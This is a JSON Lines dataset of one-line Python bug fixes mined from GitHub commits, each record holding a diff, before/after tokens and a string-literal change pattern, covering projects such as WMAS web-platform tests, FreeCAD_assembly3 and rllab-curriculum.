{"project": "sc2gameMapRepo", "commit_sha": "115b7728480f5a05769b84f8c9c505f56710ed31", "parent_sha": "1a228ef420db717a9690db68bef3c2ebc5c8a4fb", "file_path": "sc2maptool/mapRecord.py", "project_url": "https://github.com/ttinies/sc2gameMapRepo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ def standardizeMapName(mapName):\n     newName = os.path.basename(mapName)\n     newName = newName.split(\".\")[0]\n     newName = newName.split(\"(\")[0]\n-    newName = re.sub(\"[LTE]+$\", \"\", newName)\n+    newName = re.sub(\"[LT]E+$\", \"\", newName)\n     return re.sub(' ', '', newName, flags=re.UNICODE)\n \n \n", "before": "newName = re . sub ( \"[LTE]+$\" , \"\" , newName )", "after": "newName = re . sub ( \"[LT]E+$\" , \"\" , newName )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"[LTE]+$\\\"\", 3, 22, 3, 31], \"\\\"[LT]E+$\\\"\"]]"}
{"project": "WMAS", "commit_sha": "c8262a722e21c821d129aa18e765d5ec3a63ff33", "parent_sha": "f9d0147b58f595f23afb6f66326745e96e105e07", "file_path": "webdriver/tests/element_click/interactability.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,4 +59,4 @@ def test_element_not_visible_overflow_hidden(session):\n \n     element = session.find.css(\"input\", all=False)\n     response = element_click(session, element)\n-    assert_error(response, \"element not visible\")\n+    assert_error(response, \"element not interactable\")\n", "before": "assert_error ( response , \"element not visible\" )", "after": "assert_error ( response , \"element not interactable\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"element not visible\\\"\", 3, 28, 3, 49], \"\\\"element not interactable\\\"\"]]"}
{"project": "WMAS", "commit_sha": "d7859c5d92b595576b6c75b7c99b868abd9f4bdf", "parent_sha": "1bd5f7f76038479c667292bfe01d714121e1f77b", "file_path": "webdriver/ecmascript/ecmascript_test.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ import base_test\n class EcmasScriptTest(base_test.WebDriverBaseTest):\n \n     def test_that_ecmascript_returns_document_title(self):\n-        self.driver.get(self.webserver.where_is(\"javascript/ecmascript_test.html\"))\n+        self.driver.get(self.webserver.where_is(\"ecmascript/ecmascript_test.html\"))\n \n         result = self.driver.execute_script(\"return document.title;\");\n         self.assertEquals(\"ecmascript test\", result);\n", "before": "self . driver . get ( self . webserver . where_is ( \"javascript/ecmascript_test.html\" ) )", "after": "self . driver . get ( self . webserver . where_is ( \"ecmascript/ecmascript_test.html\" ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"javascript/ecmascript_test.html\\\"\", 3, 49, 3, 82], \"\\\"ecmascript/ecmascript_test.html\\\"\"]]"}
{"project": "WMAS", "commit_sha": "633f5861883dce925f4870d4d49068545fd6a8a7", "parent_sha": "b5c3d33557ea2fa4698295b07bb076eef47890e7", "file_path": "webdriver/tests/interaction/element_clear.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ def test_input_file_multiple(session, text_file):\n \n def test_select(session):\n     session.url = inline(\"\"\"\n-        <select disabled>\n+        <select>\n           <option>foo\n         </select>\n         \"\"\")\n", "before": "session . url = inline ( \"\"\"\n         <select disabled>\n           <option>foo\n         </select>\n         \"\"\" )", "after": "session . url = inline ( \"\"\"\n         <select>\n           <option>foo\n         </select>\n         \"\"\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"\\\"\\\"\\n         <select disabled>\\n           <option>foo\\n         </select>\\n         \\\"\\\"\\\"\", 2, 26, 6, 12], \"\\\"\\\"\\\"\\n         <select>\\n           <option>foo\\n         </select>\\n         \\\"\\\"\\\"\"]]"}
{"project": "WMAS", "commit_sha": "4b3342e16f320b69fef3c1809bb2614dc2109590", "parent_sha": "ddcc729bca5abcc460db875952eb693b04fe2e41", "file_path": "webdriver/tests/support/fixtures.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -214,7 +214,7 @@ def add_browser_capabilites(configuration):\n def url(server_config):\n     def inner(path, protocol=\"http\", query=\"\", fragment=\"\"):\n         port = server_config[\"ports\"][protocol][0]\n-        host = \"%s:%s\" % (server_config[\"host\"], port)\n+        host = \"%s:%s\" % (server_config[\"browser_host\"], port)\n         return urlparse.urlunsplit((protocol, host, path, query, fragment))\n \n     inner.__name__ = \"url\"\n", "before": "host = \"%s:%s\" % ( server_config [ \"host\" ] , port )", "after": "host = \"%s:%s\" % ( server_config [ \"browser_host\" ] , port )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"host\\\"\", 3, 41, 3, 47], \"\\\"browser_host\\\"\"]]"}
{"project": "WMAS", "commit_sha": "08e02fed1a222ebe2878ec32181eba7f4fb2721b", "parent_sha": "cdcb657b80f2434bc0a830fc5f37108216d7a4ad", "file_path": "webdriver/tests/navigation/get_title.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,7 +134,7 @@ def test_title_handle_prompt_missing_value(session, create_dialog):\n \n     assert_error(result, \"unexpected alert open\")\n     assert_dialog_handled(session, \"dismiss #1\")\n-    assert read_global(session, \"accept1\") == None\n+    assert read_global(session, \"dismiss1\") == None\n \n     create_dialog(\"confirm\", text=\"dismiss #2\", result_var=\"dismiss2\")\n \n", "before": "assert read_global ( session , \"accept1\" ) == None", "after": "assert read_global ( session , \"dismiss1\" ) == None", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"accept1\\\"\", 3, 33, 3, 42], \"\\\"dismiss1\\\"\"]]"}
{"project": "WMAS", "commit_sha": "e2269c2c71aa52f5b22c5e99a1008c798e28ff12", "parent_sha": "031d229a27a5c9bac6e1ad2ad9edb831d8904f5e", "file_path": "tools/wptrunner/wptrunner/browsers/sauce.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -138,7 +138,7 @@ class SauceConnect():\n     def __enter__(self, options):\n         if not self.sauce_connect_binary:\n             self.temp_dir = tempfile.mkdtemp()\n-            get_tar(\"https://saucelabs.com/downloads/sc-latest-linux.tar.gz\", self.temp_dir)\n+            get_tar(\"https://saucelabs.com/downloads/sc-4.4.9-linux.tar.gz\", self.temp_dir)\n             self.sauce_connect_binary = glob.glob(os.path.join(self.temp_dir, \"sc-*-linux/bin/sc\"))[0]\n \n         self.upload_prerun_exec('edge-prerun.bat')\n", "before": "get_tar ( \"https://saucelabs.com/downloads/sc-latest-linux.tar.gz\" , self . temp_dir )", "after": "get_tar ( \"https://saucelabs.com/downloads/sc-4.4.9-linux.tar.gz\" , self . temp_dir )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"https://saucelabs.com/downloads/sc-latest-linux.tar.gz\\\"\", 3, 21, 3, 77], \"\\\"https://saucelabs.com/downloads/sc-4.4.9-linux.tar.gz\\\"\"]]"}
{"project": "FreeCAD_assembly3", "commit_sha": "6d34ad00e9be1a85c8ee53216ae3b7e345cb15c0", "parent_sha": "053517e6e238790e412d84ff1962583bf18768db", "file_path": "solver.py", "project_url": "https://github.com/realthunder/FreeCAD_assembly3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ class Solver(object):\n                 logger.error(msg)\n             raise RuntimeError('Failed to solve {}: {}'.format(\n                 objName(assembly),e.message))\n-        self.system.log('done sloving')\n+        self.system.log('done solving')\n \n         touched = False\n         for part,partInfo in self._partMap.items():\n", "before": "self . system . log ( 'done sloving' )", "after": "self . system . log ( 'done solving' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'done sloving'\", 3, 25, 3, 39], \"'done solving'\"]]"}
{"project": "modorganizer-umbrella", "commit_sha": "20e4494444fa1ad02c66f1a5b3ac37b244eb5cb7", "parent_sha": "9bf43f7ddfcd8f2cf9766cd686134e3720638167", "file_path": "unibuild/projects/pyqt5.py", "project_url": "https://github.com/ModOrganizer2/modorganizer-umbrella", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class PyQt5Configure(build.Builder):\n             with open(serrpath, \"w\") as serr:\n                 bp = python.python['build_path']\n                 if os.path.exists(os.path.join(qt5.qt_inst_path, \"include\",\"QtNfc\")):\n-                    logging.error(\"Please rename {} to {}.disable, as it breaks PyQt5 from compiling\".format(os.path.join(qt5.qt_inst_path, \"include\",\"QtNfc\")))\n+                    logging.error(\"Please rename {0} to {0}.disable, as it breaks PyQt5 from compiling\".format(os.path.join(qt5.qt_inst_path, \"include\",\"QtNfc\")))\n                     return False\n                 proc = Popen(\n                     [os.path.join(python.python['build_path'], \"PCbuild\", \"amd64\", \"python.exe\"), \"configure.py\",\n", "before": "logging . error ( \"Please rename {} to {}.disable, as it breaks PyQt5 from compiling\" . format ( os . path . join ( qt5 . qt_inst_path , \"include\" , \"QtNfc\" ) ) )", "after": "logging . error ( \"Please rename {0} to {0}.disable, as it breaks PyQt5 from compiling\" . format ( os . path . join ( qt5 . qt_inst_path , \"include\" , \"QtNfc\" ) ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Please rename {} to {}.disable, as it breaks PyQt5 from compiling\\\"\", 3, 35, 3, 102], \"\\\"Please rename {0} to {0}.disable, as it breaks PyQt5 from compiling\\\"\"]]"}
{"project": "WMAS", "commit_sha": "6599c4f63fbda3e1cecf590f824ad3024ffbbab6", "parent_sha": "cc8aa8eef05880adbcb4b5866513eebf2a1d0bfe", "file_path": "wptserve/response.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -209,7 +209,7 @@ class Response(object):\n                \"message\": message}\n         data = json.dumps({\"error\": err})\n         self.status = code\n-        self.headers = [(\"Content-Type\", \"text/json\"),\n+        self.headers = [(\"Content-Type\", \"application/json\"),\n                         (\"Content-Length\", len(data))]\n         self.content = data\n         if code == 500:\n", "before": "self . headers = [ ( \"Content-Type\" , \"text/json\" ) , ( \"Content-Length\" , len ( data ) ) ]", "after": "self . headers = [ ( \"Content-Type\" , \"application/json\" ) , ( \"Content-Length\" , len ( data ) ) ]", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"text/json\\\"\", 3, 42, 3, 53], \"\\\"application/json\\\"\"]]"}
{"project": "WMAS", "commit_sha": "74bb79a83daf6c9db2b6c308ba8ffb1175f8bd4b", "parent_sha": "7f2979ee7a8a5ea6857dcc01d9585824d2264490", "file_path": "wptrunner/browsers/servodriver.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class ServoWebDriverBrowser(Browser):\n     used_ports = set()\n \n     def __init__(self, logger, binary, debug_info=None, webdriver_host=\"127.0.0.1\",\n-                 user_stylesheets=None, render_backend=\"cpu\"):\n+                 user_stylesheets=None, render_backend=\"webrender\"):\n         Browser.__init__(self, logger)\n         self.binary = binary\n         self.webdriver_host = webdriver_host\n", "before": "def __init__ ( self , logger , binary , debug_info = None , webdriver_host = \"127.0.0.1\" , user_stylesheets = None , render_backend = \"cpu\" ) : Browser . __init__ ( self , logger ) self . binary = binary self . webdriver_host = webdriver_host", "after": "def __init__ ( self , logger , binary , debug_info = None , webdriver_host = \"127.0.0.1\" , user_stylesheets = None , render_backend = \"webrender\" ) : Browser . __init__ ( self , logger ) self . binary = binary self . webdriver_host = webdriver_host", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"cpu\\\"\", 3, 56, 3, 61], \"\\\"webrender\\\"\"]]"}
{"project": "WMAS", "commit_sha": "6346b3d0a04be75a24466213b03b02d842a0b9e4", "parent_sha": "74bb79a83daf6c9db2b6c308ba8ffb1175f8bd4b", "file_path": "wptrunner/browsers/servo.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ def render_arg(render_backend):\n \n class ServoBrowser(NullBrowser):\n     def __init__(self, logger, binary, debug_info=None, binary_args=None,\n-                 user_stylesheets=None, render_backend=\"cpu\"):\n+                 user_stylesheets=None, render_backend=\"webrender\"):\n         NullBrowser.__init__(self, logger)\n         self.binary = binary\n         self.debug_info = debug_info\n", "before": "def __init__ ( self , logger , binary , debug_info = None , binary_args = None , user_stylesheets = None , render_backend = \"cpu\" ) : NullBrowser . __init__ ( self , logger ) self . binary = binary self . debug_info = debug_info", "after": "def __init__ ( self , logger , binary , debug_info = None , binary_args = None , user_stylesheets = None , render_backend = \"webrender\" ) : NullBrowser . __init__ ( self , logger ) self . binary = binary self . debug_info = debug_info", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"cpu\\\"\", 3, 56, 3, 61], \"\\\"webrender\\\"\"]]"}
{"project": "WMAS", "commit_sha": "9567615d99d465e256d1cbbb8a94aa0c6fce30b7", "parent_sha": "787b2aad247d6c9561d11aaf8f0ce64366ed4c0e", "file_path": "wptrunner/webdriver_server.py", "project_url": "https://github.com/cta-wave/WMAS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -153,7 +153,7 @@ class EdgeDriverServer(WebDriverServer):\n \n \n class GeckoDriverServer(WebDriverServer):\n-    def __init__(self, logger, marionette_port=2828, binary=\"wires\",\n+    def __init__(self, logger, marionette_port=2828, binary=\"geckodriver\",\n                  host=\"127.0.0.1\", port=None):\n         env = os.environ.copy()\n         env[\"RUST_BACKTRACE\"] = \"1\"\n", "before": "def __init__ ( self , logger , marionette_port = 2828 , binary = \"wires\" , host = \"127.0.0.1\" , port = None ) : env = os . environ . copy ( ) env [ \"RUST_BACKTRACE\" ] = \"1\"", "after": "def __init__ ( self , logger , marionette_port = 2828 , binary = \"geckodriver\" , host = \"127.0.0.1\" , port = None ) : env = os . environ . copy ( ) env [ \"RUST_BACKTRACE\" ] = \"1\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"wires\\\"\", 3, 61, 3, 68], \"\\\"geckodriver\\\"\"]]"}
{"project": "ncm-R", "commit_sha": "8b2e3fb8c985e82aa9ea33c526b101ff77e20a96", "parent_sha": "c7fac69a9abc18b88d53477eab8834d18247f4cc", "file_path": "pythonx/cm_sources/r.py", "project_url": "https://github.com/gaalcaras/ncm-R", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ class Source(Base):  # pylint: disable=R0902\n             return None\n \n         for filename in comps:\n-            pkg_name = re.search(r'_(\\w+)_', filename).group(1)\n+            pkg_name = re.search(r'_(.*)_', filename).group(1)\n \n             if pkg_name in self._pkg_installed:\n                 continue\n", "before": "pkg_name = re . search ( r'_(\\w+)_' , filename ) . group ( 1 )", "after": "pkg_name = re . search ( r'_(.*)_' , filename ) . group ( 1 )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:r'_(\\\\w+)_'\", 3, 34, 3, 44], \"r'_(.*)_'\"]]"}
{"project": "rllab-curriculum", "commit_sha": "d45376611dea2a2f0fa2a003eb8641280ee1022d", "parent_sha": "db690e2bf22819b5bfb380326706bf73fb68ba70", "file_path": "rllab/mjcapi/rocky_mjc_1_22/glfw.py", "project_url": "https://github.com/florensacc/rllab-curriculum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def _load_library():\n     # MODIFIED by john schulman for cs294 homework because existing method was broken\n     osp = os.path\n     if sys.platform.startswith(\"darwin\"):\n-        libfile = osp.abspath(osp.join(osp.dirname(__file__),\"../../../vendor/mujoco/1_22/osx/libglfw.dylib\"))\n+        libfile = osp.abspath(osp.join(osp.dirname(__file__),\"../../../vendor/mujoco/1_22/osx/libglfw.3.dylib\"))\n     elif sys.platform.startswith(\"linux\"):\n         libfile = osp.abspath(osp.join(osp.dirname(__file__),\"../../../vendor/mujoco/1_22/linux/libglfw.so.3\"))\n     elif sys.platform.startswith(\"win\"):\n", "before": "libfile = osp . abspath ( osp . join ( osp . dirname ( __file__ ) , \"../../../vendor/mujoco/1_22/osx/libglfw.dylib\" ) )", "after": "libfile = osp . abspath ( osp . join ( osp . dirname ( __file__ ) , \"../../../vendor/mujoco/1_22/osx/libglfw.3.dylib\" ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"../../../vendor/mujoco/1_22/osx/libglfw.dylib\\\"\", 3, 62, 3, 109], \"\\\"../../../vendor/mujoco/1_22/osx/libglfw.3.dylib\\\"\"]]"}
{"project": "rllab-curriculum", "commit_sha": "f43c294e2c995ba7c47bf4b9b145c15ee6263b30", "parent_sha": "480b5cb2d687b07245d8f72e04ae8e70af3a8055", "file_path": "sandbox/sandy/deep_q_rl/ale_data_set.py", "project_url": "https://github.com/florensacc/rllab-curriculum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ actions, and rewards.\n         self.phi_length = phi_length\n \n         # Allocate the circular buffers and indices.\n-        self.imgs = np.zeros((max_steps, height, width), dtype='uint8')\n+        self.imgs = np.zeros((max_steps, height, width), dtype='float32')\n         self.actions = np.zeros(max_steps, dtype='int32')\n         self.rewards = np.zeros(max_steps, dtype=floatX)\n         self.terminal = np.zeros(max_steps, dtype='bool')\n", "before": "self . imgs = np . zeros ( ( max_steps , height , width ) , dtype = 'uint8' )", "after": "self . imgs = np . zeros ( ( max_steps , height , width ) , dtype = 'float32' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'uint8'\", 3, 64, 3, 71], \"'float32'\"]]"}
{"project": "DeepDIVA", "commit_sha": "720716e11fc6c191ced4a3f9dc1dcb642888baa3", "parent_sha": "c6caa1dc7e81f88081386cba092afddc835367bd", "file_path": "template/CL_arguments.py", "project_url": "https://github.com/DIVA-DIA/DeepDIVA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -110,7 +110,7 @@ def _data_options(parser):\n                              action='store_true',\n                              help='Supress data balancing')\n     parser_data.add_argument('--output-folder',\n-                             default='./output/',\n+                             default='../output/',\n                              help='where to save all output files.',\n                              required=True)\n \n", "before": "help = 'Supress data balancing' ) parser_data . add_argument ( '--output-folder' , default = './output/' , help = 'where to save all output files.' , required = True )", "after": "help = 'Supress data balancing' ) parser_data . add_argument ( '--output-folder' , default = '../output/' , help = 'where to save all output files.' , required = True )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'./output/'\", 3, 38, 3, 49], \"'../output/'\"]]"}
{"project": "tello", "commit_sha": "5f67c594791b4293e172a02c3b155aea28c62019", "parent_sha": "dee9272004991fbc667ce88a5dad4281b252f14c", "file_path": "tello.py", "project_url": "https://github.com/microlinux/tello", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ import traceback\n class Tello:\n     \"\"\"Wrapper to simply interactions with the Ryze Tello drone.\"\"\"\n \n-    def __init__(self, local_ip, local_port, imperial=True, command_timeout=.3, tello_ip='127.0.0.1', tello_port=8889):\n+    def __init__(self, local_ip, local_port, imperial=True, command_timeout=.3, tello_ip='192.168.10.1', tello_port=8889):\n", "before": "def __init__ ( self , local_ip , local_port , imperial = True , command_timeout = .3 , tello_ip = '127.0.0.1' , tello_port = 8889 ) : ", "after": "def __init__ ( self , local_ip , local_port , imperial = True , command_timeout = .3 , tello_ip = '192.168.10.1' , tello_port = 8889 ) : ", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'127.0.0.1'\", 3, 90, 3, 101], \"'192.168.10.1'\"]]"}
{"project": "icfpc2014-tbd", "commit_sha": "2f1ee84d8d41dc5f1a27833231b3f311d0e6e57b", "parent_sha": "afb08a00176888cd45cb0270047fda626992946e", "file_path": "graphite_scratch/run_tournament.py", "project_url": "https://github.com/Vlad-Shcherbina/icfpc2014-tbd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def main():\n             #['py:GhostAI_Red', 'py:Splitters', 'py:Splitters', 'py:Splitters'],\n             #['ghosthon:../data/ghosts/red.ghy'],\n             ['ghc:red.ghc'],\n-            ['ghc:redsplitt.ghc'],\n+            ['ghosthon:../data/ghosts/redsplitt.ghy'],\n             #['py:Hunter'],\n         ],\n         parallel=True)\n", "before": "[ 'ghc:redsplitt.ghc' ] ,", "after": "[ 'ghosthon:../data/ghosts/redsplitt.ghy' ] ,", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'ghc:redsplitt.ghc'\", 3, 14, 3, 33], \"'ghosthon:../data/ghosts/redsplitt.ghy'\"]]"}
{"project": "uppsala", "commit_sha": "e7bb9676a16dd0da408b60eb2c770781f39b2060", "parent_sha": "6d48f0e0780cdcd2fcf83ae9ab67bda14388e050", "file_path": "users/views.py", "project_url": "https://github.com/refik/uppsala", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ def login_user(request):\n \tuser = authenticate(username=username_login, password=password_login)\n \tif user is not None:\n \t\tlogin(request, user)\n-\t\treturn render_to_response('users/apps.html',{} )\n+\t\treturn render_to_response('/',{} )\n \telse:\n \t\treturn render_to_response('users/index.html',{'status':'log_fail'})\n \n", "before": "return render_to_response ( 'users/apps.html' , { } )", "after": "return render_to_response ( '/' , { } )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'users/apps.html'\", 3, 29, 3, 46], \"'/'\"]]"}
{"project": "ropes", "commit_sha": "33f614dabf2b652aa1f019857d00e854f1289973", "parent_sha": "a4a7ce3ccaad692b090c48fb693d0fd77ee0da24", "file_path": "ropes.py", "project_url": "https://github.com/marshallward/ropes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class Rope(object):\n                     return Rope(self.data[i:j])\n \n         else:\n-            raise TypeError('list indices must be integers or slices, not {}'\n+            raise TypeError('rope indices must be integers or slices, not {}'\n                             ''.format(type(index).__name__))\n \n     def __repr__(self):\n", "before": "else : raise TypeError ( 'list indices must be integers or slices, not {}' '' . format ( type ( index ) . __name__ ) )", "after": "else : raise TypeError ( 'rope indices must be integers or slices, not {}' '' . format ( type ( index ) . __name__ ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'list indices must be integers or slices, not {}'\", 3, 29, 3, 78], \"'rope indices must be integers or slices, not {}'\"]]"}
{"project": "gmail", "commit_sha": "23068d4a884aae1b108d53b52b04dc05d1c19301", "parent_sha": "dce2d8469ad565b3a8fad30b8c6d91c4e5abe09d", "file_path": "gmail/message.py", "project_url": "https://github.com/girishramnani/gmail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ class Message():\n         self.message = email.message_from_string(raw_email)\n \n         self.to = self.message['to']\n-        self.fr = self.message['fr']\n+        self.fr = self.message['from']\n         self.delivered_to = self.message['delivered_to']\n \n         self.subject = self.message['subject']\n", "before": "self . fr = self . message [ 'fr' ]", "after": "self . fr = self . message [ 'from' ]", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'fr'\", 3, 32, 3, 36], \"'from'\"]]"}
{"project": "align-videos-by-sound", "commit_sha": "39c216cca8cee67d388b72c2b6fb789b5fd0b4fa", "parent_sha": "3d92db08de1b7cd61d42266574964b4e0d2ee159", "file_path": "align_videos_by_soundtrack/simple_stack_videos.py", "project_url": "https://github.com/jeorgen/align-videos-by-sound", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ different thing from this. See the option description.\"\"\")\n     parser.add_argument(\n         \"files\", nargs=\"+\",\n         help=\"The media files which contains both video and audio.\")\n-    parser.editor_add_output_argument(default=\"merged.mp4\")\n+    parser.editor_add_output_argument(default=\"merged.mkv\")\n     parser.editor_add_output_params_argument(\n         notice=\"Note: In this script, width and height are ignored.\")\n     parser.editor_add_mode_argument()\n", "before": "parser . editor_add_output_argument ( default = \"merged.mp4\" )", "after": "parser . editor_add_output_argument ( default = \"merged.mkv\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"merged.mp4\\\"\", 3, 47, 3, 59], \"\\\"merged.mkv\\\"\"]]"}
{"project": "Visual_Script", "commit_sha": "95f9101f312eb76486323fbbd3d55ac2c21895dd", "parent_sha": "b735d780798ae90be95c6e1fa0e0da68d2eab4c2", "file_path": "tests/File/test_Project.py", "project_url": "https://github.com/NTUTVisualScript/Visual_Script", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ class ProjectTestSuite(unittest.TestCase):\n         result = {'Suite1':['case1', 'case2', 'case3'], 'Suite2':['case2']}\n         self.assertEqual(result, project.getJSON())\n         self.assertTrue(os.path.isdir('./File/Project1/Suite1/case3'))\n-        self.assertTrue(os.path.isfile('./File/Project1/Suite1/case3/case3.json'))\n+        self.assertTrue(os.path.isfile('./File/Project1/Suite1/case3/testcase.json'))\n     def testAddException(self):\n         d = {'Suite1':['case1', 'case2'], 'Suite2':['case2']}\n         project = Project(self.path, d)\n", "before": "self . assertTrue ( os . path . isfile ( './File/Project1/Suite1/case3/case3.json' ) )", "after": "self . assertTrue ( os . path . isfile ( './File/Project1/Suite1/case3/testcase.json' ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'./File/Project1/Suite1/case3/case3.json'\", 3, 40, 3, 81], \"'./File/Project1/Suite1/case3/testcase.json'\"]]"}
{"project": "Visual_Script", "commit_sha": "2e2a807aed48b3dde5a35bc12dffe64019898e5c", "parent_sha": "31f23c917e562a87729bb47524552d986a5dd307", "file_path": "GeometrA/src/TestScript/__init__.py", "project_url": "https://github.com/NTUTVisualScript/Visual_Script", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class TestScript:\n             report.stepStart(step)\n             status = exe.execute(i)\n             report.stepEnd(step, i)\n-            loop = 'Loop'\n+            loop = 'Loop Begin'\n             if step.getAction() == loop:\n                 i = exe.loopEnd(i)\n             f = 'Failed'\n", "before": "loop = 'Loop'", "after": "loop = 'Loop Begin'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'Loop'\", 3, 20, 3, 26], \"'Loop Begin'\"]]"}
{"project": "palabra", "commit_sha": "c8782cf246e794475cf6f1b3a0413ae6e805e50c", "parent_sha": "696f12b77c56c16b5e8261be849ca3beb750e01e", "file_path": "palabralib/export.py", "project_url": "https://github.com/svisser/palabra", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class ExportWindow(gtk.Dialog):\n         pdf = Format(\"pdf\", u\"PDF (pdf)\", [\"puzzle\", \"grid\", \"solution\", \"answers\"])\n         pdf.add(Setting(\"page\", \"bool\", u\"Include header\", \"page_header_include\", True))\n         pdf.add(Setting(\"page\", \"bool\", u\"Include header on each page\", \"page_header_include_all\", False))\n-        pdf.add(Setting(\"page\", \"text\", u\"Header:\", \"page_header_text\", u\"%T / %F / %P\"))\n+        pdf.add(Setting(\"page\", \"text\", u\"Header:\", \"page_header_text\", u\"%T / %A\"))\n         pdf.add(Setting(\"grid\", \"spin\", u\"Cell size in puzzle (mm)\", \"cell_size_puzzle\", 7, (5, 10)))\n         pdf.add(Setting(\"grid\", \"spin\", u\"Cell size in solution (mm)\", \"cell_size_solution\", 6, (5, 10)))\n         pdf.add(Setting(\"grid\", \"combo\", u\"Align grid:\", \"align\", \"right\"\n", "before": "pdf . add ( Setting ( \"page\" , \"text\" , u\"Header:\" , \"page_header_text\" , u\"%T / %F / %P\" ) )", "after": "pdf . add ( Setting ( \"page\" , \"text\" , u\"Header:\" , \"page_header_text\" , u\"%T / %A\" ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:u\\\"%T / %F / %P\\\"\", 3, 73, 3, 88], \"u\\\"%T / %A\\\"\"]]"}
{"project": "reviews-assigner", "commit_sha": "f2ce77ce713610ddd7ee1b08768d2a84121f0803", "parent_sha": "e4bddbbcadafa81b6d928a19f475dc15891bc024", "file_path": "hunter/reviewsapi.py", "project_url": "https://github.com/anapaulagomes/reviews-assigner", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ class ReviewsAPI:\n \n             return response\n         except requests.exceptions.HTTPError:\n-            raise UnauthorizedToken('Maybe it\\'s time to change you token!')\n+            raise UnauthorizedToken('Maybe it\\'s time to change your token!')\n \n     def certifications(self):\n         return self.execute(lambda : requests.get(CERTIFICATIONS_URL, headers=self.headers))\n", "before": "except requests . exceptions . HTTPError : raise UnauthorizedToken ( 'Maybe it\\'s time to change you token!' )", "after": "except requests . exceptions . HTTPError : raise UnauthorizedToken ( 'Maybe it\\'s time to change your token!' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'Maybe it\\\\'s time to change you token!'\", 3, 37, 3, 76], \"'Maybe it\\\\'s time to change your token!'\"]]"}
